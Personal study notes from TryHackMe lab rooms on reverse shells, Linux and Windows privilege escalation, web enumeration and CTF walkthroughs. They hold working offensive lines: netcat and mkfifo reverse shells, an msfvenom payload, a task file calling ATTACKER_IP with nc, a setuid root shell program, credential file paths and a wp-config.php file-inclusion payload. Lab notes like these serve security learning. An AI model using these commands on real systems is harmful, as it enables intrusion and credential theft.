# R

* Remember for web/general/security
* .todo: dns discord
* web general | terminology | URL may have to be moved

<hr>

## Notes

* CTF = capture the flag

<hr>

## Prev esc

https://tryhackme.com/room/linprivesc
=> hint/notes
=> network

* https://tryhackme.com/room/introtoshells
* If there are tools not installed on your target: https://github.com/andrew-d/static-binaries
* nc ip port -e /bin/bash (rev shell)
* nc -lvnp port -e /bin/bash (bind shell)
* this is not included in most versions of netcat
* `mkfifo /tmp/f; nc XXX < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f` (listener for our wxw shell)
* https://tryhackme.com/room/introtoshells (Windows)
* https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#netcat-traditional
* `msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>`
* staged reverse shell payloads and stageless
* exploit/multi/handler
  * It's essential if you want to use Meterpreter shells, and is the go-to when using staged payloads
  * `set PAYLOAD X`
  * `exploit -j`
* socat is a sort of ncat+more, but not installed by default, and harder to learn.
  * Read again the section: https://tryhackme.com/room/introtoshells
  * Can encrypt, may bypass an IDS: https://tryhackme.com/room/introtoshells
* Socat: transfer the socat binary
* Reverse shells/... note lasty

https://tryhackme.com/room/linprivesc
=> capabilities
=> `getcap -r / 2>/dev/null`
=> gtfobins
* https://www.revshells.com/ (sh => bash)
* if no_root_squash present
* Another alternative to this program, is to create a suite file with a copy of bash.

```c
int main() {
  setgid(0);
  setuid(0);
  system("/bin/bash");
  return 0;
}
```

* https://tryhackme.com/room/windowsprivesc20 (premium)

```
Misconfigurations on Windows services or scheduled tasks
Excessive privileges assigned to our account
Vulnerable software
Missing Windows security patches
```

* System are more perms that admin
* Windows Deployment Services: deploy an image to serveral hosts. These are refereed as Unattended, Admin account required to create them. Credentials

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

* PowerShell's history: `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` and in a cmd `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
* List saved crendetials `cmdkey /list`. Run command as another user? `runas /savecred /user:admin cmd.exe`
* Internet Information Services (IIS) is the default web server on Windows installations.

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

* PuTTY `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
* `schtasks /query /tn vulntask /fo list /v`: look for ones in which we can inject/modify the binary
* Start task manually `schtasks /run /tn vulntask` (CTF)
* `icacls c:\tasks\schtask.bat`: check permissions (F=Full Access)
* (cmd) `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > task.bat`
* Windows installer files (-f msi -o malicious.msi)
* Windows services are managed by the Service Control Manager (SCM).
* `sc qc` (ahah, my steel moutain)
* IN A EFFING CMD BITCH (otherwise: sc.exe)
* Unquoted Service Paths
  * If there are space in the executable space
  * and there is an executable that can be created in the path of the service
  * then the executable will be executed with the rest of the path as arguments
  * AD and WD privileges, allowing the user to create subdirectories and files
  * https://askubuntu.com/questions/1075098/remmina-scaling-options
* Insecure Service Permissions
* XXX
* https://tryhackme.com/room/windowsprivesc20 (dropped fur now)
* XXX
* Moar
  * https://github.com/bitsadmin/wesng
  * https://blog.bitsadmin.com/blog/windows-security-updates-for-hackers
  * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
  * https://github.com/gtworek/Priv2Admin
  * https://github.com/antonioCoco/RogueWinRM
  * https://jlajara.gitlab.io/Potatoes_Windows_Privesc
  * https://decoder.cloud/
  * https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
  * https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

<hr>

## Forced Browsing

* https://tryhackme.com/room/webenumerationv2
  * Gobuster options.
  * -k for ssl errors
* Gobuster DNS/VHosts
* Useful wordlists
* nmap `-n` redo
* add a warning + 64th
* `cat /usr/share/wordlists/dirb/extensions_common.txt | tr '\n' ','`
* `gobuster -u` for vhost
* `gobuster vhost -u http://webenum.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t50 --append-domain` (in new versions of gobuster, false by default)
* NOT FINISHED https://tryhackme.com/room/webenumerationv2

> While participating in rooms on TryHackMe, virtual hosts would be a good way to hide a completely different website if nothing turned up on your main port 80/443 scan.

<hr>

## Overconfidence

--- https://tryhackme.com/room/steelmountain

* use meterpreter upload to upload the winPEAS
* `upload /tmp/xxx`
* `shell`
* `.\winPEASany_ofs.exe`
* `powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"`
* `powershell -ep bypass -c ". .\PowerUp.ps1;"`
* `https://github.com/itm4n/PrivescCheck#metasploit-timeout`
* `load powershell`
* `powershell_shell`
* `. .\PowerUp.ps1; Invoke-AllChecks`
* `. .\PowerUp.ps1` `PS > Invoke-AllChecks`
* https://www.joesandbox.com/#windows
* https://github.com/EgeBalci/sgn
* sc qc XXX
* sc stop XXX
* `Write-ServiceBinary -Name 'XXX' -Path ".\nc.exe"`
* sc start XXX
* `powershell -c wget "URL" -outfile "OUTPUT"`
* like OTX: https://cyware.com/

--- https://tryhackme.com/room/easyctf 🐍🐍🐍

* `python2 simple.py`
* oh gosh, volatily + `pip install --upgrade setuptools` https://stackoverflow.com/questions/31719816/pip-fails-to-install-anything-error-invalid-command-egg-info
* `print "[+] Specify an url target"`

--- https://tryhackme.com/room/cowboyhacker

* nmap
* FTP exposed
* Hydra ssh
* SUID

--- https://tryhackme.com/room/lazyadmin 🐍🐍🐍

* nmap
* gobuster
* ...

--- https://tryhackme.com/room/startup

* nmap
* gobuster
* ftp
* file upload
* wireshark
* crontab

Others

* If FTP is asking for a password, press enter
* FTP do not seem to work with path (to upload with put, but it works if you start FTP in the directory where the file is)
* Press F12 to go back to penelope UI. You can use upload/download. Go back with `interact 1`
* wireshark `.pcapng`. Then right-click on interesting packets, and click on "follow TCP Stream"
* crontab for a user (`ls /var/spool/cron/crontabs/root` root). https://github.com/DominicBreuker/pspy
* Proper name for this section whelp 😭

--- https://tryhackme.com/room/allinonemj 🐍🐍🐍

* Kali right-arrow
* Test: `wpscan --url http://10.10.162.222/wordpress/ --detection-mode aggressive`
* `php://filter/convert.base64-encode/resource=../../../../../wp-config.php` (file inclusion)